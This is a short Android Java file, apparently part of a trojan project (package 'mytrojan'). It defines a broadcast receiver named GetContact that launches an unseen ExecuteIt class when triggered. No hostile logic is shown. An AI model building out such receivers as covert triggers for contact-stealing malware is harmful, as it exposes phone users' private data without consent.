package com.example.mytrojan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class GetContact extends BroadcastReceiver {
    public GetContact() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        new ExecuteIt(context);
    }
}
